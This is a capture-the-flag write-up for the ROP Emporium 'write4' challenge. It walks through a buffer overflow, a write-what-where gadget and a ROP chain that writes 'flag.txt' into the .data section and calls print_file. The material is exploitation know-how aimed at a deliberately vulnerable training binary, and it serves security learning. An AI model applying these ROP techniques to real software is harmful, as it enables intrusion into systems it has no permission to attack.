# Write4 - ROP Emporium Writeup

## Challenge Overview

Write4 introduces the concept of **writing data to memory** using ROP gadgets. Unlike previous challenges where the string `/bin/cat flag.txt` or similar was already present in memory, this challenge requires us to write the string `flag.txt` ourselves before calling `print_file()`.

## Binary Analysis

### Protections
```bash
checksec write4
```
- **NX enabled**: Stack is not executable, requiring ROP
- **No PIE**: Addresses are static, making exploitation easier

### Key Functions
- `pwnme()`: Vulnerable function with buffer overflow
- `print_file()`: Prints contents of a file (takes filename pointer as argument)

### The Problem
The string `flag.txt` does not exist in the binary. We need to:
1. Write `flag.txt` to a writable memory location
2. Call `print_file()` with a pointer to that string

## Gadget Analysis

### The Write Gadget (usefulGadgets)
```asm
0x400628: mov QWORD PTR [r14], r15    ; Write 8 bytes from r15 to address in r14
0x40062b: ret
```

This is a **write-what-where primitive**:
- `r14` = **WHERE** (destination address)
- `r15` = **WHAT** (8-byte value to write)

### Supporting Gadgets (found with ropper)
```bash
ropper -f write4 | grep r15
```

| Address | Gadget | Purpose |
|---------|--------|---------|
| `0x400690` | `pop r14; pop r15; ret` | Load destination and value from stack |
| `0x400693` | `pop rdi; ret` | Set first argument for function call |

## Writable Memory Section

```bash
readelf -S write4 | grep -E "data|bss"
```

| Section | Address | Size |
|---------|---------|------|
| `.data` | `0x601028` | Writable, good for storing our string |
| `.bss` | `0x601038` | Also writable (uninitialized data) |

We'll use `.data` at `0x601028` to store `flag.txt`.

## Exploit Strategy

### Buffer Overflow
- Buffer size: 32 bytes
- Saved RBP: 8 bytes
- **Total padding: 40 bytes**

### ROP Chain Structure
```
1. Overflow buffer with 40 bytes of padding
2. pop r14; pop r15; ret     -> Load .data address into r14, "flag.txt" into r15
3. mov [r14], r15; ret       -> Write "flag.txt" to .data section
4. pop rdi; ret              -> Load .data address into rdi (first argument)
5. print_file()              -> Call function to print flag.txt contents
```

### Visual Stack Layout After Overflow
```
+---------------------------+
| AAAA... (40 bytes)        |  <- Padding
+---------------------------+
| 0x400690                  |  <- pop r14; pop r15; ret
+---------------------------+
| 0x601028                  |  <- r14 = .data address (WHERE)
+---------------------------+
| "flag.txt"                |  <- r15 = string to write (WHAT)
+---------------------------+
| 0x400628                  |  <- mov [r14], r15; ret
+---------------------------+
| 0x400693                  |  <- pop rdi; ret
+---------------------------+
| 0x601028                  |  <- rdi = pointer to "flag.txt"
+---------------------------+
| print_file@plt            |  <- Call print_file()
+---------------------------+
```

## Lessons Learned

1. **Write primitives** are powerful gadgets that allow writing arbitrary data to memory
2. **Writable sections** (.data, .bss) can be used to store attacker-controlled strings
3. **Pwntools** can automatically find gadgets and resolve symbols, making exploit development faster
4. The string `flag.txt` is exactly 8 bytes, so a single write operation is sufficient

## References

- [ROP Emporium - write4](https://ropemporium.com/challenge/write4.html)
- [Pwntools Documentation](https://docs.pwntools.com/)
